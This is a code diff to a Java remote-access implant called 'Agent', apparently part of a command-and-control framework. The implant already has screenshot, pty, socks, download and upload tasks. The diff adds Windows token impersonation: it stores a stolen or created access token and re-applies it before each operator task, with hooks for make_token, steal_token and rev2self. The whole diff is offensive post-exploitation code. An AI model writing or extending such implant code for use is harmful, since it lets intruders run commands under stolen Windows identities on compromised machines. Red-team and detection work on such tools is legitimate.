@@ -4,6 +4,8 @@ import com.woopsie.tasks.BackgroundTask;
 import com.woopsie.tasks.DownloadBackgroundTask;
 import com.woopsie.tasks.PtyBackgroundTask;
 import com.woopsie.tasks.UploadBackgroundTask;
+import com.woopsie.utils.WindowsAPI;
+import com.sun.jna.platform.win32.WinNT;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -17,6 +19,9 @@ public class Agent {
     private final CommunicationHandler commHandler;
     private final Map<String, BackgroundTask> backgroundTasks;
     private volatile boolean running = true;
+    
+    // Token impersonation state
+    private static volatile WinNT.HANDLE currentImpersonationToken = null;
     
     public Agent(Config config) throws Exception {
         this.config = config;
@@ -179,6 +184,12 @@ public class Agent {
             if ("screenshot".equals(command) || "pty".equals(command) || "socks".equals(command)) {
                 Config.debugLog(config, "Command " + command + " is background-only, starting background task");
                 return startBackgroundTask(taskId, command, parameters);
+            }
+            
+            // Re-apply impersonation token if one is active (before executing task)
+            if (currentImpersonationToken != null) {
+                Config.debugLog(config, "Re-applying impersonation token before task execution");
+                WindowsAPI.reApplyToken(currentImpersonationToken);
             }
             
             // Execute the task with proper parameters
@@ -536,6 +547,34 @@ public class Agent {
     
     public void stop() {
         running = false;
+    }
+    
+    /**
+     * Set the current impersonation token (called by make_token/steal_token)
+     */
+    public static void setImpersonationToken(WinNT.HANDLE token) {
+        currentImpersonationToken = token;
+    }
+    
+    /**
+     * Clear the current impersonation token (called by rev2self)
+     */
+    public static void clearImpersonationToken() {
+        if (currentImpersonationToken != null) {
+            try {
+                WindowsAPI.closeHandle(currentImpersonationToken);
+            } catch (Exception e) {
+                // Ignore
+            }
+            currentImpersonationToken = null;
+        }
+    }
+    
+    /**
+     * Get the current impersonation token
+     */
+    public static WinNT.HANDLE getImpersonationToken() {
+        return currentImpersonationToken;
     }
     
     public static void main(String[] args) throws Exception {
